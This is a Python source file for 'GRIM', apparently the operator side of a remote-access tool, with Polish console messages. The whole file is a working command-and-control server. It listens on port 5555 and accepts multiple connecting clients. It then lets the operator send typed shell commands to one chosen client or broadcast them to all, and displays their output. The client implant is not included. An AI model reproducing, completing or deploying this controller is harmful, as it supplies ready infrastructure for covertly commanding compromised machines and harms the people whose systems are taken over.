import socket
import threading
import os
from colorama import Fore # type: ignore
import ctypes

clients = {}


def logo():
    print(f"{Fore.RED}   /")
    print(f" ")
    print(f" ██████    ██████    ██   ███    ███")
    print(f"██        ██   ██   ██   ████  ████")
    print(f"██  ████  ██████    ██   ██ ████ ██")
    print(f"██    ██  ██   ██   ██   ██  ██  ██")
    print(f" ██████   ██   ██   ██   ██      ██")
    print(f" ")

if __name__ == "__main__":
    logo()
    print("Program działa")

def handle_client(client_socket, addr):
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"GRIM  | CONNECTED CLIENTS: {len(clients)}")

    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"\n{Fore.GREEN}[{addr[0]}Output]: {Fore.RESET}{response}")
        except (ConnectionResetError, BrokenPipeError):
            break
    
    print(f"\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}]Client {addr} rozłączony.")
    client_socket.close()
    del clients[addr]


def accept_client(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()


def start_server(host="0.0.0.0", port=5555):
    server =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")


    threading.Thread(target=accept_client, args=(server,), daemon=True).start()
    os.system('cls')
    logo()
    print(f"[{Fore.YELLOW}?{Fore.RESET}] czekanie aż klient się połączy. . .")

    while True:
        if not clients:
            continue


        print("\n[połączony clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx} {addr[0]}:{addr[1]}")


        try:
            choice = int(input("wybierz numer klienta(lub 0 Broadcast): ")) - 1
        except ValueError:
            continue


        
        if choice == -1:
            command =  input("Wpisz komende do wysłania (broadcast): ")
            for client in clients.values():
                client.send(command.encode())
        elif 0 <= choice < len(clients):
            target_addr = list(clients.keys())[choice]
            command = input(f"Wpisz komende do wysłania {target_addr[0]}: ")
            clients[target_addr].send(command.encode())
        else:
            print("[!] invalid selection.")

if __name__ == "__main__":
    start_server()